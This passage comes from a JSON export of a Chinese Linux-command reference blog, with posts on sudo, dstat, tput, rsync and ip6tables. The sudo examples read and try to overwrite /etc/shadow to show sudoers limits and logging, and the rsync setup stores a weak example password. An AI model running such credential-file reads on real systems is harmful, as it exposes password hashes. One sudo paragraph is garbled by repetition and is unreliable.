icmpv6 --icmpv6-type 143 -s fe80::/10 -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type 151 -s fe80::/10 -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type 152 -s fe80::/10 -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type 153 -s fe80::/10 -j ACCEPT -A ICMPv6 -j RETURN -A OUTPUT -p icmpv6 -j ACCEPT ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ip6tables","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ip6tables/","stats":{"text":"8 min read","time":469000,"words":1611,"minutes":8},"date":"2022-02-02 16:03:31","dateFormat":"2022-02-02"},{"content":"以其他身份来执行命令。 补充说明 sudo 命令用来以其他身份来执行命令，预设的身份为 root。在/etc/sudoers中设置了可执行 sudo 指令的用户。若其未经授权的用户企图使用 sudo，则会发出警告的邮件给管理员。用户使用 sudo 时，必须先输入密码，之后有 5 分钟的有效期限，超过期限则必须重新输入密码。 语法 sudo (选项) (参数) 选项 -b：在后台执行指令； -h：显示帮助； -H：将 HOME 环境变量设为新身份的 HOME 环境变量； -k：结束密码的有效期限，也就是下次再执行 sudo 时便需要输入密码； 。 -l：列出目前用户可执行与无法执行的指令； -p：改变询问密码的提示符号； -s&lt;shell&gt;：执行指定的 shell； -u&lt;用户&gt;：以指定的用户作为新的身份。若不加上此参数，则预设以 root 作为新的身份； -v：延长密码有效期限 5 分钟； -V ：显示版本信息。 参数 指令：需要运行的指令和对应的参数。 实例 $ sudo su - # env | grep -E '(HOME|SHELL|USER|LOGNAME|^PATH|PWD|TEST_ETC|TEST_ZSH|TEST_PRO|TEST_BASH|TEST_HOME|SUDO)' 这个命令相当于使用 root 超级用户重新登录一次 shell，只不过密码是使用的当前用户的密码。而且重要是，该命令会 重新加载/etc/profile 文件以及/etc/bashrc 文件等系统配置文件，并且还会重新加载 root 用户的SHELL环境变量所对应的配置文件，比如：root超级用户的SHELL 环境变量所对应的配置文件 ，比如：root 超级用户的SHELL环境变量所对应的配置文件，比如：root超级用户的SHELL 是/bin/bash，则会加载/root/.bashrc 等配置。如果是/bin/zsh，则会加载/root/.zshrc 等配置，执行后是完全的 root 环境。 $ sudo -i # env | grep -E '(HOME|SHELL|USER|LOGNAME|^PATH|PWD|TEST_ETC|TEST_ZSH|TEST_PRO|TEST_BASH|TEST_HOME|SUDO)' 这个命令基本与 sudo su - 相同，执行后也是 root 超级用户的环境，只不过是多了一些当前用户的信息。 $ sudo -s # env|grep -E '(HOME|SHELL|USER|LOGNAME|^PATH|PWD|TEST_ETC|TEST_ZSH|TEST_PRO|TEST_BASH|TEST_HOME|SUDO)' --color 这个命令相当于 以当前用户的SHELL开启了一个root超级用户的no−login的shell，不会加载/etc/profile等系统配置。所以/etc/profile文件中定义的TESTETC环境变量就看不到了，但是会加载root用户对应的配置文件，比如root用户的SHELL 开启了一个 root 超级用户的 no-login 的 shell，不会加载/etc/profile 等系统配置 。所以/etc/profile 文件中定义的 TEST_ETC 环境变量就看不到了，但是会加载 root 用户对应的配置文件，比如 root 用户的SHELL开启了一个root超级用户的no−login的shell，不会加载/etc/profile等系统配置。所以/etc/profile文件中定义的TESTE​TC环境变量就看不到了，但是会加载root用户对应的配置文件，比如root用户的SHELL 是/bin/zsh，那么会加载/root/.zshrc 配置文件，执行完后，不会切换当前用户的目录。 配置 sudo 必须通过编辑/etc/sudoers文件，而且只有超级用户才可以修改它，还必须使用 visudo 编辑。之所以使用 visudo 有两个原因，一是它能够防止两个用户同时修改它； 二是它也能进行有限的语法检查。所以，即使只有你一个超级用户，你也最好用 visudo 来检查一下语法。 visudo 默认的是在 vi 里打开配置文件，用 vi 来修改文件。我们可以在编译时修改这个默认项。visudo 不会擅自保存带有语法错误的配置文件，它会提示你出现的问题，并询问该如何处理，就像： &gt;&gt;&gt; sudoers file: syntax error, line 22 &lt;&lt; 此时我们有三种选择：键入“e”是重新编辑，键入“x”是不保存退出，键入“Q”是退出并保存。如果真选择 Q，那么 sudo 将不会再运行，直到错误被纠正。 现在，我们一起来看一下神秘的配置文件，学一下如何编写它。让我们从一个简单的例子开始：让用户 Foobar 可以通过 sudo 执行所有 root 可执行的命令。以 root 身份用 visudo 打开配置文件，可以看到类似下面几行： # Runas alias specification # User privilege specificationroot ALL=(ALL)ALL 我们一看就明白个差不多了，root 有所有权限，只要仿照现有 root 的例子就行，我们在下面加一行（最好用 tab 作为空白）： foobar ALL=(ALL) ALL 保存退出后，切换到 foobar 用户，我们用它的身份执行命令： [foobar@localhost ~]$ ls /root ls: /root: 权限不够 [foobar@localhost ~]$ sudo ls /root PassWord: anaconda-ks.cfg Desktop install.log install.log.syslog 好了，我们限制一下 foobar 的权利，不让他为所欲为。比如我们只想让他像 root 那样使用 ls 和 ifconfig，把那一行改为： foobar localhost= /sbin/ifconfig, /bin/ls 再来执行命令： [foobar@localhost ~]$ sudo head -5 /etc/shadow Password: Sorry, user foobar is not allowed to execute '/usr/bin/head -5 /etc/shadow' as root on localhost.localdomain. [foobar@localhost ~]$ sudo /sbin/ifconfigeth0 Linkencap:Ethernet HWaddr 00:14:85:EC:E9:9B... 现在让我们来看一下那三个 ALL 到底是什么意思。第一个 ALL 是指网络中的主机，我们后面把它改成了主机名，它指明 foobar 可以在此主机上执行后面的命令。第二个括号里的 ALL 是指目标用户，也就是以谁的身份去执行命令。最后一个 ALL 当然就是指命令名了。例如，我们想让 foobar 用户在 linux 主机上以 jimmy 或 rene 的身份执行 kill 命令，这样编写配置文件： foobar linux=(jimmy,rene) /bin/kill 但这还有个问题，foobar 到底以 jimmy 还是 rene 的身份执行？这时我们应该想到了sudo -u了，它正是用在这种时候。 foobar 可以使用sudo -u jimmy kill PID或者sudo -u rene kill PID，但这样挺麻烦，其实我们可以不必每次加-u，把 rene 或 jimmy 设为默认的目标用户即可。再在上面加一行： Defaults:foobar runas_default=rene Defaults 后面如果有冒号，是对后面用户的默认，如果没有，则是对所有用户的默认。就像配置文件中自带的一行： Defaults env_reset 另一个问题是，很多时候，我们本来就登录了，每次使用 sudo 还要输入密码就显得烦琐了。我们可不可以不再输入密码呢？当然可以，我们这样修改配置文件： foobar localhost=NOPASSWD: /bin/cat, /bin/ls 再来 sudo 一下： [foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg Desktop install.log install.log.syslog 当然，你也可以说“某些命令用户 foobar 不可以运行”，通过使用!操作符，但这不是一个好主意。因为，用!操作符来从 ALL 中“剔出”一些命令一般是没什么效果的，一个用户完全可以把那个命令拷贝到别的地方，换一个名字后再来运行。 日志与安全 sudo 为安全考虑得很周到，不仅可以记录日志，还能在有必要时向系统管理员报告。但是，sudo 的日志功能不是自动的，必须由管理员开启。这样来做： touch /var/log/sudo vi /etc/syslog.conf 在 syslog.conf 最后面加一行（必须用 tab 分割开）并保存： local2.debug /var/log/sudo 重启日志守候进程， ps aux grep syslogd 把得到的 syslogd 进程的 PID（输出的第二列是 PID）填入下面： kill –HUP PID 这样，sudo 就可以写日志了： [foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg Desktop install.log install.log.syslog $cat /var/log/sudoJul 28 22:52:54 localhost sudo: foobar : TTY=pts/1 ; pwd=/home/foobar ; USER=root ; command=/bin/ls /root 不过，有一个小小的“缺陷”，sudo 记录日志并不是很忠实： [foobar@localhost ~]$ sudo cat /etc/shadow &gt; /dev/null cat /var/log/sudo...Jul 28 23:10:24 localhost sudo: foobar : TTY=pts/1 ; PWD=/home/foobar ; USER=root ; COMMAND=/bin/cat /etc/shadow 重定向没有被记录在案！为什么？因为在命令运行之前，shell 把重定向的工作做完了，sudo 根本就没看到重定向。这也有个好处，下面的手段不会得逞： [foobar@localhost ~]$ sudo ls /root &gt; /etc/shadowbash: /etc/shadow: 权限不够 sudo 有自己的方式来保护安全。以 root 的身份执行sudo-V，查看一下 sudo 的设置。因为考虑到安全问题，一部分环境变量并没有传递给 sudo 后面的命令，或者被检查后再传递的，比如：PATH，HOME，SHELL 等。当然，你也可以通过 sudoers 来配置这些环境变量。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sudo","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sudo/","stats":{"text":"9 min read","time":515000,"words":2188,"minutes":9},"date":"2022-02-02 16:03:16","dateFormat":"2022-02-02"},{"content":"通用的系统资源统计工具。 补充说明 dstat 命令是一个用来替换 vmstat、iostat、netstat、nfsstat 和 ifstat 这些命令的工具，是一个全能系统信息统计工具。与 sysstat 相比，dstat 拥有一个彩色的界面，在手动观察性能状况时，数据比较显眼容易观察； 而且 dstat 支持即时刷新，譬如输入dstat 3即每三秒收集一次，但最新的数据都会每秒刷新显示。和 sysstat 相同的是，dstat 也可以收集指定的性能资源，譬如dstat -c即显示 CPU 的使用情况。 下载安装 方法一 yum install -y dstat 方法二 官网下载地址：http://dag.wieers.com/rpm/packages/dstat wget http://dag.wieers.com/rpm/packages/dstat/dstat-0.6.7-1.rh7.rf.noarch.rpm rpm -ivh dstat-0.6.7-1.rh7.rf.noarch.rpm 使用说明 安装完后就可以使用了，dstat 非常强大，可以实时的监控 cpu、磁盘、网络、IO、内存等使用情况。 直接使用 dstat，默认使用的是-cdngy参数，分别显示 cpu、disk、net、page、system 信息，默认是 1s 显示一条信息。可以在最后指定显示一条信息的时间间隔，如dstat 5是没 5s 显示一条，dstat 5 10表示没 5s 显示一条，一共显示 10 条。 [root@iZ23uulau1tZ ~]# dstat ----total-cpu-usage---- -dsk/total- -net/total- ---paging-- ---system-- usr sys idl wai hiq siq| read writ| recv send| in out | int csw 0 0 99 0 0 0|7706B 164k| 0 0 | 0 0 | 189 225 0 0 100 0 0 0| 0 0 |4436B 826B| 0 0 | 195 248 1 0 99 0 0 0| 0 0 |4744B 346B| 0 0 | 203 242 0 0 100 0 0 0| 0 0 |5080B 346B| 0 0 | 206 242 0 1 99 0 0 0| 0 0 |5458B 444B| 0 0 | 214 244 1 0 99 0 0 0| 0 0 |5080B 346B| 0 0 | 208 242 下面对显示出来的部分信息作一些说明： cpu：hiq、siq 分别为硬中断和软中断次数。 system：int、csw 分别为系统的中断次数（interrupt）和上下文切换（context switch）。 其他的都很好理解。 语法 dstat [-afv] [options..] [delay [count]] 常用选项 -c：显示 CPU 系统占用，用户占用，空闲，等待，中断，软件中断等信息。 -C：当有多个 CPU 时候，此参数可按需分别显示 cpu 状态，例：-C 0,1 是显示 cpu0 和 cpu1 的信息。 -d：显示磁盘读写数据大小。 -D hda,total：include hda and total。 -n：显示网络状态。 -N eth1,total：有多块网卡时，指定要显示的网卡。 -l：显示系统负载情况。 -m：显示内存使用情况。 -g：显示页面使用情况。 -p：显示进程状态。 -s：显示交换分区使用情况。 -S：类似 D/N。 -r：I/O 请求情况。 -y：系统状态。 --ipc：显示 ipc 消息队列，信号等信息。 --socket：用来显示 tcp udp 端口状态。 -a：此为默认选项，等同于-cdngy。 -v：等同于 -pmgdsc -D total。 --output 文件：此选项也比较有用，可以把状态信息以 csv 的格式重定向到指定的文件中，以便日后查看。例：dstat --output /root/dstat.csv &amp; 此时让程序默默的在后台运行并把结果输出到/root/dstat.csv 文件中。 当然 dstat 还有很多更高级的用法，常用的基本这些选项，更高级的用法可以结合 man 文档。 实例 如想监控 swap，process，sockets，filesystem 并显示监控的时间： [root@iZ23uulau1tZ ~]# dstat -tsp --socket --fs ----system---- ----swap--- ---procs--- ------sockets------ --filesystem- date/time | used free|run blk new|tot tcp udp raw frg|files inodes 26-07 09:23:48| 0 0 | 0 0 0.0|104 8 5 0 0| 704 6488 26-07 09:23:49| 0 0 | 0 0 0|104 8 5 0 0| 704 6488 26-07 09:23:50| 0 0 | 0 0 0|104 8 5 0 0| 704 6489 26-07 09:23:51| 0 0 | 0 0 0|104 8 5 0 0| 704 6489 26-07 09:23:52| 0 0 | 0 0 0|104 8 5 0 0| 704 6489 26-07 09:23:53| 0 0 | 0 0 0|104 8 5 0 0| 704 6489 若要将结果输出到文件可以加--output filename： [root@iZ23uulau1tZ ~]# dstat -tsp --socket --fs --output /tmp/ds.csv ----system---- ----swap--- ---procs--- ------sockets------ --filesystem- date/time | used free|run blk new|tot tcp udp raw frg|files inodes 26-07 09:25:31| 0 0 | 0 0 0.0|104 8 5 0 0| 736 6493 26-07 09:25:32| 0 0 | 0 0 0|104 8 5 0 0| 736 6493 26-07 09:25:33| 0 0 | 0 0 0|104 8 5 0 0| 736 6493 26-07 09:25:34| 0 0 | 0 0 0|104 8 5 0 0| 736 6493 26-07 09:25:35| 0 0 | 0 0 0|104 8 5 0 0| 736 6494 26-07 09:25:36| 0 0 | 0 0 0|104 8 5 0 0| 736 6494 这样生成的 csv 文件可以用 excel 打开，然后生成图表。 通过dstat --list可以查看 dstat 能使用的所有参数，其中上面 internal 是 dstat 本身自带的一些监控参数，下面/usr/share/dstat中是 dstat 的插件，这些插件可以扩展 dstat 的功能，如可以监控电源（battery）、mysql 等。 下面这些插件并不是都可以直接使用的，有的还依赖其他包，如想监控 mysql，必须要装 python 连接 mysql 的一些包。 [root@iZ23uulau1tZ ~]# dstat --list internal: aio, cpu, cpu24, disk, disk24, disk24old, epoch, fs, int, int24, io, ipc, load, lock, mem, net, page, page24, proc, raw, socket, swap, swapold, sys, tcp, time, udp, unix, vm /usr/share/dstat: battery, battery-remain, cpufreq, dbus, disk-util, fan, freespace, gpfs, gpfs-ops, helloworld, innodb-buffer, innodb-io, innodb-ops, lustre, memcache-hits, mysql-io, mysql-keys, mysql5-cmds, mysql5-conn, mysql5-io, mysql5-keys, net-packets, nfs3, nfs3-ops, nfsd3, nfsd3-ops, ntp, postfix, power, proc-count, rpc, rpcd, sendmail, snooze, thermal, top-bio, top-cpu, top-cputime, top-cputime-avg, top-io, top-latency, top-latency-avg, top-mem, top-oom, utmp, vm-memctl, vmk-hba, vmk-int, vmk-nic, vz-cpu, vz-io, vz-ubc, wifi ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dstat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dstat/","stats":{"text":"7 min read","time":390000,"words":1371,"minutes":7},"date":"2022-02-02 16:00:58","dateFormat":"2022-02-02"},{"content":"通过 terminfo 数据库对终端会话进行初始化和操作。 补充说明 tput 命令将通过 terminfo 数据库对您的终端会话进行初始化和操作。通过使用 tput，您可以更改几项终端功能，如移动或更改光标、更改文本属性，以及清除终端屏幕的特定区域。 什么是 terminfo 数据库？ UNIX 系统上的 terminfo 数据库用于定义终端和打印机的属性及功能，包括各设备（例如，终端和打印机）的行数和列数以及要发送至该设备的文本的属性。UNIX 中的几个常用程序都依赖 terminfo 数据库提供这些属性以及许多其他内容，其中包括 vi 和 emacs 编辑器以及 curses 和 man 程序。 与 UNIX 中的大多数命令一样，tput 命令既可以用在 shell 命令行中也可以用在 shell 脚本中。为让您更好地理解 tput，本文首先从命令行讲起，然后紧接着讲述 shell 脚本示例。 光标属性 在 UNIX shell 脚本中或在命令行中，移动光标或更改光标属性可能是非常有用的。有些情况下，您可能需要输入敏感信息（如密码），或在屏幕上两个不同的区域输入信息。在此类情况下，使用 tput 可能会对您有所帮助。 tput clear # 清屏 tput sc # 保存当前光标位置 tput cup 10 13 # 将光标移动到 row col tput civis # 光标不可见 tput cnorm # 光标可见 tput rc # 显示输出 exit 0 移动光标 使用 tput 可以方便地实现在各设备上移动光标的位置。通过在 tput 中使用 cup 选项，或光标位置，您可以在设备的各行和各列中将光标移动到任意 X 或 Y 坐标。设备左上角的坐标为 (0,0)。 要在设备上将光标移动到第 5 列 (X) 的第 1 行 (Y)，只需执行 tput cup 5 1。另一个示例是 tput cup 23 45，此命令将使光标移动到第 23 列上的第 45 行。 移动光标并显示信息 另一种有用的光标定位技巧是移动光标，执行用于显示信息的命令，然后返回到前一光标位置： (tput sc ; tput cup 23 45 ; echo “Input from tput/echo at 23/45” ; tput rc) 下面我们分析一下 subshell 命令： tput sc 必须首先保存当前的光标位置。要保存当前的光标位置，请包括 sc 选项或“save cursor position”。 tput cup 23 45 在保存了光标位置后，光标坐标将移动到 (23,45)。 echo “Input from tput/echo at 23/45” 将信息显示到 stdout 中。 tput rc 在显示了这些信息之后，光标必须返回到使用 tput sc 保存的原始位置。要使光标返回到其上次保存的位置，请包括 rc 选项或“restore cursor position”。 注意：由于本文首先详细介绍了通过命令行执行 tput，因此您可能会觉得在自己的 subshell 中执行命令要比单独执行每条命令然后在每条命令执行之前显示提示更简洁。 更改光标的属性 在向某一设备显示数据时，很多时候您并不希望看到光标。将光标转换为不可见可以使数据滚动时的屏幕看起来更整洁。要使光标不可见，请使用 civis 选项（例如，tput civis）。在数据完全显示之后，您可以使用 cnorm 选项将光标再次转变为可见。 文本属性 更改文本的显示方式可以让用户注意到菜单中的一组词或警惕用户注意某些重要的内容。您可以通过以下方式更改文本属性：使文本加粗、在文本下方添加下划线、更改背景颜色和前景颜色，以及逆转颜色方案等。 要更改文本的颜色，请使用 setb 选项（用于设置背景颜色）和 setf 选项（用于设置前景颜色）以及在 terminfo 数据库中分配的颜色数值。通常情况下，分配的数值与颜色的对应关系如下，但是可能会因 UNIX 系统的不同而异： 0：黑色 1：蓝色 2：绿色 3：青色 4：红色 5：洋红色 6：黄色 7：白色 执行以下示例命令可以将背景颜色更改为黄色，将前景颜色更改为红色： tput setb 6 tput setf 4 要反显当前的颜色方案，只需执行tput rev。 有时，仅为文本着色还不够，也就是说，您想要通过另一种方式引起用户的注意。可以通过两种方式达到这一目的：一是将文本设置为粗体，二是为文本添加下划线。 要将文本更改为粗体，请使用 bold 选项。要开始添加下划线，请使用 smul 选项。在完成显示带下划线的文本后，请使用 rmul 选项。 实例 使输出的字符串有颜色，底色，加粗： #!/bin/bash printf $(tput setaf 2; tput bold)'color show&lt;span title=&quot;\\n&quot;&gt;\\n&lt;span title=&quot;\\n&quot;&gt;\\n'$(tput sgr0) for((i=0; i&lt;=7; i++)); do echo $(tput setaf $i)&quot;show me the money&quot;$(tput sgr0) done printf '&lt;span title=&quot;\\n&quot;&gt;\\n'$(tput setaf 2; tput setab 0; tput bold)'background color show'$(tput sgr0)'&lt;span title=&quot;\\n&quot;&gt;\\n&lt;span title=&quot;\\n&quot;&gt;\\n' for((i=0,j=7; i&lt;=7; i++,j--)); do echo $(tput setaf $i; tput setab $j; tput bold)&quot;show me the money&quot;$(tput sgr0) done exit 0 输出格式控制函数： #!/bin/bash # $1 str print string # $2 color 0-7 设置颜色 # $3 bgcolor 0-7 设置背景颜色 # $4 bold 0-1 设置粗体 # $5 underline 0-1 设置下划线 function format_output(){ str=$1 color=$2 bgcolor=$3 bold=$4 underline=$5 normal=$(tput sgr0) case &quot;$color&quot; in 0|1|2|3|4|5|6|7) setcolor=$(tput setaf $color;) ;; *) setcolor=&quot;&quot; ;; esac case &quot;$bgcolor&quot; in 0|1|2|3|4|5|6|7) setbgcolor=$(tput setab $bgcolor;) ;; *) setbgcolor=&quot;&quot; ;; esac if [ &quot;$bold&quot; = &quot;1&quot; ]; then setbold=$(tput bold;) else setbold=&quot;&quot; fi if [ &quot;$underline&quot; = &quot;1&quot; ]; then setunderline=$(tput smul;) else setunderline=&quot;&quot; fi printf &quot;$setcolor$setbgcolor$setbold$setunderline$str$normal&lt;span title=&quot;\\n&quot;&gt;\\n&quot; } format_output &quot;Yesterday Once more&quot; 2 5 1 1 exit 0 光标属性例子： #!/bin/bash # clear the screen tput clear # Move cursor to screen location X,Y (top left is 0,0) tput cup 3 15 # set a foreground colour using ANSI escape tput setaf 3 echo &quot;XYX Corp LTD.&quot; tput sgr0 tput cup 5 17 # Set reverse video mode tput rev echo &quot;M A I N - M E N U&quot; tput sgr0 tput cup 7 15 echo &quot;1\\. User Management&quot; tput cup 8 15 echo &quot;2\\. service Management&quot; tput cup 9 15 echo &quot;3\\. Process Management&quot; tput cup 10 15 echo &quot;4\\. Backup&quot; # Set bold mode tput bold tput cup 12 15 read -p &quot;Enter your choice [1-4] &quot; choice tput clear tput sgr0 tput rc exit 0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tput","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tput/","stats":{"text":"8 min read","time":434000,"words":1712,"minutes":8},"date":"2022-02-02 16:00:42","dateFormat":"2022-02-02"},{"content":"远程数据同步工具。 补充说明 rsync 命令是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件。rsync 使用所谓的“rsync 算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 rsync 是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。 语法 rsync [OPTION]... SRC DEST rsync [OPTION]... SRC [USER@]host:DEST rsync [OPTION]... [USER@]HOST:SRC DEST rsync [OPTION]... [USER@]HOST::SRC DEST rsync [OPTION]... SRC [USER@]HOST::DEST rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST] 对应于以上六种命令格式，rsync 有六种不同的工作模式： 拷贝本地文件。当 SRC 和 DES 路径信息都不包含有单个冒号&quot;:&quot;分隔符时就启动这种工作模式。如：rsync -a /data /backup 使用一个远程 shell 程序 (如 rsh、ssh) 来实现将本地机器的内容拷贝到远程机器。当 DST 路径地址包含单个冒号&quot;:&quot;分隔符时启动该模式。如：rsync -avz *.c foo:src 使用一个远程 shell 程序 (如 rsh、ssh) 来实现将远程机器的内容拷贝到本地机器。当 SRC 地址路径包含单个冒号&quot;:&quot;分隔符时启动该模式。如：rsync -avz foo:src/bar /data 从远程 rsync 服务器中拷贝文件到本地机。当 SRC 路径信息包含&quot;::&quot;分隔符时启动该模式。如：rsync -av root@192.168.78.192::www /databack 从本地机器拷贝文件到远程 rsync 服务器中。当 DST 路径信息包含&quot;::&quot;分隔符时启动该模式。如：rsync -av /databack root@192.168.78.192::www 列远程机的文件列表。这类似于 rsync 传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://192.168.78.192/www 选项 -v, --verbose 详细模式输出。 -q, --quiet 精简输出模式。 -c, --checksum 打开校验开关，强制对文件传输进行校验。 -a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。 -r, --recursive 对子目录以递归模式处理。 -R, --relative 使用相对路径信息。 -b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix 选项来指定不同的备份文件前缀。 --backup-dir 将备份文件 (如~filename) 存放在在目录下。 -suffix=SUFFIX 定义备份文件前缀。 -u, --update 仅仅进行更新，也就是跳过所有已经存在于 DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。 -l, --links 保留软链结。 -L, --copy-links 想对待常规文件一样处理软链结。 --copy-unsafe-links 仅仅拷贝指向 SRC 路径目录树以外的链结。 --safe-links 忽略指向 SRC 路径目录树以外的链结。 -H, --hard-links 保留硬链结。 -p, --perms 保持文件权限。 -o, --owner 保持文件属主信息。 -g, --group 保持文件属组信息。 -D, --devices 保持设备文件信息。 -t, --times 保持文件时间信息。 -S, --sparse 对稀疏文件进行特殊处理以节省 DST 的空间。 -n, --dry-run 现实哪些文件将被传输。 -w, --whole-file 拷贝文件，不进行增量检测。 -x, --one-file-system 不要跨越文件系统边界。 -B, --block-size=SIZE 检验算法使用的块尺寸，默认是 700 字节。 -e, --rsh=command 指定使用 rsh、ssh 方式进行数据同步。 --rsync-path=PATH 指定远程服务器上的 rsync 命令所在路径信息。 -C, --cvs-exclude 使用和 CVS 一样的方法自动忽略文件，用来排除那些不希望传输的文件。 --existing 仅仅更新那些已经存在于 DST 的文件，而不备份那些新创建的文件。 --delete 删除那些 DST 中 SRC 没有的文件。 --delete-excluded 同样删除接收端那些被该选项指定排除的文件。 --delete-after 传输结束以后再删除。 --ignore-errors 及时出现 IO 错误也进行删除。 --max-delete=NUM 最多删除 NUM 个文件。 --partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。 --force 强制删除目录，即使不为空。 --numeric-ids 不将数字的用户和组 id 匹配为用户名和组名。 --timeout=time ip 超时时间，单位为秒。 -I, --ignore-times 不跳过那些有同样的时间和长度的文件。 --size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。 --modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为 0。 -T --temp-dir=DIR 在 DIR 中创建临时文件。 --compare-dest=DIR 同样比较 DIR 中的文件来决定是否需要备份。 -P 等同于 --partial。 --progress 显示备份过程。 -z, --compress 对备份的文件在传输时进行压缩处理。 --exclude=PATTERN 指定排除不需要传输的文件模式。 --include=PATTERN 指定不排除而需要传输的文件模式。 --exclude-from=FILE 排除 FILE 中指定模式的文件。 --include-from=FILE 不排除 FILE 指定模式匹配的文件。 --version 打印版本信息。 --address 绑定到特定的地址。 --config=FILE 指定其他的配置文件，不使用默认的 rsyncd.conf 文件。 --port=PORT 指定其他的 rsync 服务端口。 --blocking-io 对远程 shell 使用阻塞 IO。 -stats 给出某些文件的传输状态。 --progress 在传输时现实传输过程。 --log-format=formAT 指定日志文件格式。 --password-file=FILE 从 FILE 中得到密码。 --bwlimit=KBPS 限制 I/O 带宽，KBytes per second。 -h, --help 显示帮助信息。 实例 SSH 方式 首先在服务端启动 ssh 服务： service sshd start 启动 sshd： [确定 ] 使用 rsync 进行同步 接下来就可以在客户端使用 rsync 命令来备份服务端上的数据了，SSH 方式是通过系统用户来进行备份的，如下： rsync -vzrtopg --progress -e ssh --delete work@172.16.78.192:/www/* /databack/experiment/rsync work@172.16.78.192's password: receiving file list ... 5 files to consider test/ a 0 100% 0.00kB/s 527:35:41 (1, 20.0% of 5) b 67 100% 65.43kB/s 0:00:00 (2, 40.0% of 5) c 0 100% 0.00kB/s 527:35:41 (3, 60.0% of 5) dd 100663296 100% 42.22MB/s 0:00:02 (4, 80.0% of 5) sent 96 bytes received 98190 bytes 11563.06 bytes/sec total size is 100663363 speedup is 1024.19 上面的信息描述了整个的备份过程，以及总共备份数据的大小。 后台服务方式 启动 rsync 服务，编辑/etc/xinetd.d/rsync文件，将其中的disable=yes改为disable=no，并重启 xinetd 服务，如下： vi /etc/xinetd.d/rsync #default: off # description: The rsync server is a good addition to an ftp server, as it \\ # allows crc checksumming etc. service rsync { disable = no socket_type = stream wait = no user = root server = /usr/bin/rsync server_args = --daemon log_on_failure += USERID } /etc/init.d/xinetd restart 停止 xinetd： [确定 ] 启动 xinetd： [确定 ] 创建配置文件，默认安装好 rsync 程序后，并不会自动创建 rsync 的主配置文件，需要手工来创建，其主配置文件为“/etc/rsyncd.conf”，创建该文件并插入如下内容： vi /etc/rsyncd.conf uid=root gid=root max connections=4 log file=/var/log/rsyncd.log pid file=/var/run/rsyncd.pid lock file=/var/run/rsyncd.lock secrets file=/etc/rsyncd.passwd hosts deny=172.16.78.0/22 [www] comment= backup web path=/www read only = no exclude=test auth users=work 创建密码文件，采用这种方式不能使用系统用户对客户端进行认证，所以需要创建一个密码文件，其格式为“username:password”，用户名可以和密码可以随便定义，最好不要和系统帐户一致，同时要把创建的密码文件权限设置为 600，这在前面的模块参数做了详细介绍。 echo &quot;work:abc123&quot; &gt; /etc/rsyncd.passwd chmod 600 /etc/rsyncd.passwd 备份，完成以上工作，现在就可以对数据进行备份了，如下： rsync -avz --progress --delete work@172.16.78.192::www /databack/experiment/rsync Password: receiving file list ... 6 files to consider ./ files... a 0 100% 0.00kB/s 528:20:41 (1, 50.0% of 6) b 67 100% 65.43kB/s 0:00:00 (2, 66.7% of 6) c 0 100% 0.00kB/s 528:20:41 (3, 83.3% of 6) dd 100663296 100% 37.49MB/s 0:00:02 (4, 100.0% of 6) sent 172 bytes received 98276 bytes 17899.64 bytes/sec total size is 150995011 speedup is 1533.75 恢复，当服务器的数据出现问题时，那么这时就需要通过客户端的数据对服务端进行恢复，但前提是服务端允许客户端有写入权限，否则也不能在客户端直接对服务端进行恢复，使用 rsync 对数据进行恢复的方法如下： rsync -avz --progress /databack/experiment/rsync/ work@172.16.78.192::www Password: building file list ... 6 files to consider ./ a b 67 100% 0.00kB/s 0:00:00 (2, 66.7% of 6) c sent 258 bytes received 76 bytes 95.43 bytes/sec total size is 150995011 speedup is 452080.87 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rsync","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rsync/","stats":{"text":"10 min read","time":573000,"words":2271,"minutes":10},"date":"2022-02-02 15:57:15","dateFormat":"2022-02-02"},{"content":"安装核心载入开机管理程序。 补充说明 lilo 命令用于安装核心载入，开机管理程序。lilo 是个 Linux 系统核心载入程序，同时具备管理开机的功能。单独执行 lilo 指令，它会读取/etc/lilo.conf 配置文件，然后根据其内容安装 lilo。 Linux lilo 已经成为所有 Linux 发行版的标准组成部分。作为一个 较老的/最老的 Linux 引导加载程序，它那不断壮大的 Linux 社区支持使它能够随时间的推移而发展，并始终能够充当一个可用的现代引导加载程序。有一些新的功能，比如增强的用户界面，以及对能够突破原来 1024-柱面限制的新 BIOS 功能的利用。 虽然 LILO 仍在不断地发展，但 LILO 工作原理的基本概念保持不变。 语法 lilo (选项) 选项 -b&lt;外围设备代号&gt;：指定安装 lilo 之处的外围设备代号； -c：使用紧致映射模式； -C&lt;配置文件&gt;：指定 lilo 的配置文件； -d&lt;延迟时间&gt;：设置开机延迟时间； 